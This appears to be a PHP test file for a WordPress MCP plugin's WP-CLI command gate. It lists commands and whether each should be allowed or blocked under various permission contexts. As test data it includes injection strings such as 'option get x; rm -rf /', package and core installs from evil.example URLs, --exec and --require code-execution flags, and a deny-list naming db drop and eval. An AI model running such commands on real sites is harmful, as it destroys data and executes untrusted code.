<?php
/**
 * wp_cli gate (Simple_MCP_CLI::gate): a table of commands and the verdict each must get under each
 * permission context. Ported from the CLI role's harness; one test per section so a regression points
 * at the rule that broke.
 */

/** Permission contexts used by the tables below. */
function smcp_gate_ctx(string $name): array {
    $off = ['server_ops' => false, 'multisite' => false, 'super_admin' => false,
            'deny' => ['db drop', 'db reset', 'db clean', 'db import', 'site empty', 'eval', 'eval-file']];
    switch ($name) {
        case 'on':  return ['server_ops' => true] + $off;
        case 'msn': return ['multisite' => true, 'super_admin' => false] + $off; // multisite, site admin
        case 'mss': return ['multisite' => true, 'super_admin' => true] + $off;  // multisite, super admin
        default:    return $off;
    }
}

/**
 * Runs [command, ctx, 'allow'|'block'] rows; a command the tokenizer refuses counts as blocked.
 * Collects every mismatch so one run reports them all.
 */
function smcp_gate_table(array $rows): void {
    smcp_require_method('Simple_MCP_CLI', 'gate');
    $wrong = [];
    foreach ($rows as [$command, $ctx, $want]) {
        $ctx    = is_array($ctx) ? $ctx : smcp_gate_ctx($ctx);
        $tokens = Simple_MCP_CLI::tokenize($command);
        $why    = $tokens === null ? 'tokenize refused it' : Simple_MCP_CLI::gate($tokens, $ctx);
        $got    = $why === null ? 'allow' : 'block';
        if ($got !== $want) {
            $wrong[] = sprintf('"%s" [%s]: expected %s, got %s%s', $command, smcp_gate_mode($ctx), $want, $got, $why !== null ? " ($why)" : '');
        }
    }
    if ($wrong) {
        throw new SMCP_Test_Failure(count($wrong) . " of " . count($rows) . " cases wrong:\n          " . implode("\n          ", $wrong));
    }
}

function smcp_gate_mode(array $ctx): string {
    return ($ctx['server_ops'] ? 'ops on' : 'ops off') . ($ctx['multisite'] ? ($ctx['super_admin'] ? ', ms super' : ', ms admin') : '');
}

smcp_test('cli gate table: content and read commands pass without Server ops', function () {
    smcp_gate_table([
        ['option get blogname', 'off', 'allow'],
        ['post list --post_type=page --format=count', 'off', 'allow'],
        ['--user=1 post list', 'off', 'allow'],
        ['post update 12 --post_title="My Title"', 'off', 'allow'],
        ['option set foo bar', 'off', 'allow'],
        ['option update twitter_handle @vitalii', 'off', 'allow'],
        ['search-replace "@old" "@new" --dry-run', 'off', 'allow'],
        ['post meta set 5 key val', 'off', 'allow'],
        ['post-meta update 5 k v', 'off', 'allow'],
        ['cache flush', 'off', 'allow'],
        ['rewrite flush', 'off', 'allow'],
        ['transient delete --all', 'off', 'allow'],
        ['transient delete-all', 'off', 'allow'],
        ['db query "SELECT 1"', 'off', 'allow'],
        ['db export -', 'off', 'allow'],
        ['db dump -', 'off', 'allow'],
        ['sql query "SELECT 1"', 'off', 'allow'],
        ['user list', 'off', 'allow'],
        ['menu list', 'off', 'allow'],
        ['media regenerate --yes', 'off', 'allow'],
        ['site switch-language uk', 'off', 'allow'],
        ['w3-total-cache flush all', 'off', 'allow'],
        ['help plugin install', 'off', 'allow'],
        ['plugin install foo --help', 'off', 'allow'],
        ['eval --help', 'off', 'allow'],
        ['-x plugin delete akismet', 'off', 'allow'], // WP-CLI: unknown command "-x" (harmless)
        ['--url=other.test post list', 'off', 'allow'], // single site: harmless
    ]);
});

smcp_test('cli gate table: read-only lifecycle subcommands pass without Server ops', function () {
    smcp_gate_table([
        ['plugin', 'off', 'allow'],
        ['plugin list', 'off', 'allow'],
        ['plugin list --format=count', 'off', 'allow'],
        ['plugin get akismet', 'off', 'allow'],
        ['plugin status', 'off', 'allow'],
        ['plugin is-installed akismet', 'off', 'allow'],
        ['plugin is-active akismet', 'off', 'allow'],
        ['plugin path akismet', 'off', 'allow'],
        ['plugin search seo', 'off', 'allow'],
        ['plugin verify-checksums --all', 'off', 'allow'],
        ['checksum plugin akismet', 'off', 'allow'],
        ['plugin auto-updates status --all', 'off', 'allow'],
        ['plugin auto-updates', 'off', 'allow'],
        ['theme list', 'off', 'allow'],
        ['theme status', 'off', 'allow'],
        ['theme is-active melodiyahir', 'off', 'allow'],
        ['theme mod get background_color', 'off', 'allow'],
        ['theme mod list', 'off', 'allow'],
        ['theme mod', 'off', 'allow'],
        ['core version', 'off', 'allow'],
        ['core version --extra', 'off', 'allow'],
        ['core is-installed', 'off', 'allow'],
        ['core check-update', 'off', 'allow'],
        ['core verify-checksums', 'off', 'allow'],
        ['checksum core', 'off', 'allow'],
        ['language', 'off', 'allow'],
        ['language core', 'off', 'allow'],
        ['language core list', 'off', 'allow'],
        ['core language list', 'off', 'allow'],
        ['language plugin list --all', 'off', 'allow'],
        ['language theme is-installed x uk', 'off', 'allow'],
        ['config', 'off', 'allow'],
        ['config get DB_NAME', 'off', 'allow'],
        ['config get', 'off', 'allow'],
        ['config list', 'off', 'allow'],
        ['config has WP_DEBUG', 'off', 'allow'],
        ['config is-true WP_DEBUG', 'off', 'allow'],
        ['config path', 'off', 'allow'],
        ['maintenance-mode status', 'off', 'allow'],
        ['maintenance-mode is-active', 'off', 'allow'],
        ['scaffold', 'off', 'allow'], // namespace → usage only
        ['i18n', 'off', 'allow'],
        ['cli version', 'off', 'allow'],
        ['cli info', 'off', 'allow'],
        ['--version', 'off', 'allow'],
        ['--info', 'off', 'allow'],
    ]);
});

smcp_test('cli gate table: lifecycle writes and their aliases need Server ops', function () {
    smcp_gate_table([
        ['plugin install akismet', 'off', 'block'],
        ['plugin update --all', 'off', 'block'],
        ['plugin upgrade --all', 'off', 'block'],
        ['plugin update-all', 'off', 'block'],
        ['plugin delete akismet', 'off', 'block'],
        ['plugin uninstall advanced-custom-fields-pro --deactivate', 'off', 'block'],
        ['plugin activate akismet', 'off', 'block'],
        ['plugin deactivate akismet', 'off', 'block'],
        ['plugin toggle akismet', 'off', 'block'],
        ['plugin auto-updates enable --all', 'off', 'block'],
        ['plugin auto-updates disable x', 'off', 'block'],
        ['PLUGIN Delete akismet', 'off', 'block'],
        ['"plugin" "delete" akismet', 'off', 'block'],
        ['--quiet plugin delete akismet', 'off', 'block'],
        ['plugin --quiet delete akismet', 'off', 'block'],
        ['plugin delete akismet --HELP', 'off', 'block'], // --HELP is NOT help for WP-CLI
        ['plugin delete akismet --help=', 'off', 'allow'], // isset(assoc[help]) → help plugin delete
        ['theme install x', 'off', 'block'],
        ['theme update --all', 'off', 'block'],
        ['theme upgrade --all', 'off', 'block'],
        ['theme update-all', 'off', 'block'],
        ['theme delete twentytwentyfour', 'off', 'block'],
        ['theme uninstall twentytwentyfour', 'off', 'block'],
        ['theme activate x', 'off', 'block'],
        ['theme enable x', 'off', 'block'],
        ['theme disable x', 'off', 'block'],
        ['theme mod set a b', 'off', 'block'],
        ['theme mod remove a', 'off', 'block'],
        ['core update', 'off', 'block'],
        ['core upgrade', 'off', 'block'],
        ['core update https://evil.example/wp.zip', 'off', 'block'],
        ['core download --force', 'off', 'block'],
        ['core install --url=x --title=y --admin_user=z --admin_email=a@b.c', 'off', 'block'],
        ['core update-db', 'off', 'block'],
        ['core multisite-convert', 'off', 'block'],
        ['core install-network', 'off', 'block'],
        ['core multisite-install', 'off', 'block'],
        ['core config --dbname=x --dbuser=y', 'off', 'block'],
        ['language core install uk', 'off', 'block'],
        ['core language install uk', 'off', 'block'],
        ['language plugin update --all', 'off', 'block'],
        ['language core activate uk', 'off', 'block'],
        ['language theme uninstall x uk', 'off', 'block'],
        ['language core update', 'off', 'block'],
        ['config set WP_DEBUG true --raw', 'off', 'block'],
        ['config delete WP_DEBUG', 'off', 'block'],
        ['config create --dbname=x --dbuser=y', 'off', 'block'],
        ['config edit', 'off', 'block'],
        ['config shuffle-salts', 'off', 'block'],
        ['maintenance-mode activate', 'off', 'block'],
        ['maintenance-mode deactivate', 'off', 'block'],
        ['scaffold plugin foo', 'off', 'block'],
        ['plugin scaffold foo', 'off', 'block'],
        ['scaffold cpt book', 'off', 'block'],
        ['scaffold _s mytheme', 'off', 'block'],
        ['i18n make-pot . x.pot', 'off', 'block'],
        ['i18n make-php languages', 'off', 'block'],
        ['server', 'off', 'block'],
        ['server --port=8080', 'off', 'block'],
    ]);
});

smcp_test('cli gate table: cli/package self-modification, @alias and code-exec flags are always refused', function () {
    smcp_gate_table([
        ['cli', 'off', 'block'],
        ['cli update', 'off', 'block'],
        ['cli alias add @u --set-url=http://example.test', 'off', 'block'],
        ['cli aliases', 'off', 'block'],
        ['cli alias list', 'off', 'block'],
        ['cli cache clear', 'off', 'block'],
        ['cli has-command plugin', 'off', 'block'],
        ['cli check-update', 'off', 'block'],
        ['package install https://evil.example/pkg.zip', 'off', 'block'],
        ['package list', 'off', 'block'],
        ['package', 'off', 'block'],
        ['@u eval "echo 1"', 'off', 'block'],
        ['@u plugin delete akismet', 'off', 'block'],
        ['@all option get blogname', 'off', 'block'],
        ['@u option get blogname', 'off', 'block'],
        ['--debug @u plugin list', 'off', 'block'],
        ['--exec=phpinfo() post list', 'off', 'block'],
        ['post list --exec=phpinfo()', 'off', 'block'],
        ['--require=/tmp/x.php post list', 'off', 'block'],
        ['--ssh=host post list', 'off', 'block'],
        ['--http=https://x post list', 'off', 'block'],
        ['--path=/other option get blogname', 'off', 'block'],
        ['option get blogname --path /tmp', 'off', 'block'],
        ['--prompt post create', 'off', 'block'],
        ['post create --prompt=post_title', 'off', 'block'],
        ['--no-exec post list', 'off', 'block'],
        ['--EXEC=x post list', 'off', 'block'],
        ['package install x', 'on', 'block'],
        ['cli update', 'on', 'block'],
        ['@u plugin list', 'on', 'block'],
        ['--exec=x plugin list', 'on', 'block'],
    ]);
});

smcp_test('cli gate table: deny-list is normalised on both sides', function () {
    smcp_gate_table([
        ['db drop --yes', 'off', 'block'],
        ['sql drop --yes', 'off', 'block'],
        ['db reset --yes', 'off', 'block'],
        ['db clean --yes', 'off', 'block'],
        ['db import x.sql', 'off', 'block'],
        ['sql import x.sql', 'off', 'block'],
        ['site empty --yes', 'off', 'block'],
        ['blog empty --yes', 'off', 'block'],
        ['eval "echo 1;"', 'off', 'block'],
        ['eval-file x.php', 'off', 'block'],
        ['--user=1 eval "echo 1;"', 'off', 'block'],
        ['EVAL "echo 1;"', 'off', 'block'],
        ['"db" "drop"', 'off', 'block'],
        ['db   drop', 'off', 'block'],
        ['db drop --yes', 'on', 'block'], // Server ops never lift the deny-list
        ['db export -', ['deny' => ['db dump']] + smcp_gate_ctx('off'), 'block'],
        ['plugin update --all', ['deny' => ['plugin upgrade']] + smcp_gate_ctx('on'), 'block'],
        ['theme delete x', ['deny' => ['theme uninstall']] + smcp_gate_ctx('on'), 'block'],
        ['option update x y', ['deny' => ['option set']] + smcp_gate_ctx('off'), 'block'],
        ['db drop', ['deny' => []] + smcp_gate_ctx('off'), 'allow'], // the deny-list is configurable
    ]);
});

smcp_test('cli gate table: Server ops allow lifecycle writes', function () {
    smcp_gate_table([
        ['plugin install akismet', 'on', 'allow'],
        ['plugin uninstall akismet', 'on', 'allow'],
        ['plugin upgrade --all', 'on', 'allow'],
        ['theme uninstall x', 'on', 'allow'],
        ['core update', 'on', 'allow'],
        ['config set WP_DEBUG true --raw', 'on', 'allow'],
        ['scaffold plugin foo', 'on', 'allow'],
        ['server', 'on', 'allow'],
    ]);
});

smcp_test('cli gate table: multisite network flags are super-admin only', function () {
    smcp_gate_table([
        ['--url=sub.example.test post list', 'msn', 'block'],
        ['post list --url=sub.example.test', 'msn', 'block'],
        ['--blog=sub.example.test post list', 'msn', 'block'],
        ['plugin list --network', 'msn', 'block'],
        ['post list', 'msn', 'allow'],
        ['--url=sub.example.test post list', 'mss', 'allow'],
        ['plugin list --network', 'mss', 'allow'],
        ['plugin activate x --network', 'mss', 'block'], // still a server op
    ]);
});

smcp_test('cli gate table: shell metacharacters never reach the gate', function () {
    foreach (['option get x; rm -rf /', 'post list && id', 'post list | cat', 'post list `id`', 'post list $(id)', 'option get "unclosed', 'post list > /tmp/x'] as $command) {
        smcp_assert_null(Simple_MCP_CLI::tokenize($command), $command);
    }
});
